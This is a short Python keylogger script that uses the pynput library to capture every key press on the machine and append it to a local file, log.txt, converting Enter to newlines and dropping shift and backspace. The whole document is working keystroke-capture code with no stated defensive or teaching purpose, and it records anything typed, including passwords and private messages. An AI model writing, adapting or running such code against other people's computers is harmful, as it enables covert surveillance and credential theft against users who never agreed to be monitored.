#!/usr/bin/env python3
from pynput.keyboard import Listener
from datetime import datetime

def log_keystroke(key):
    now = datetime.now()
    key = str(key).replace("'", "")

    if key == "Key.enter":
        key = '\n'

    with open("log.txt", 'a') as f:
        #if key == None:
            #f.write('\n')
            #f.write(now.strftime("%m/%d/%Y %H:%M:%S"))
            #f.write('\n')

        if key == "Key.space":
            key = ' '
            f.write(key)

        if key == "Key.shift":
            key = ""
            f.write(key)
        
        if key == "Key.backspace":
            key = ""
            f.write(key)

        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()
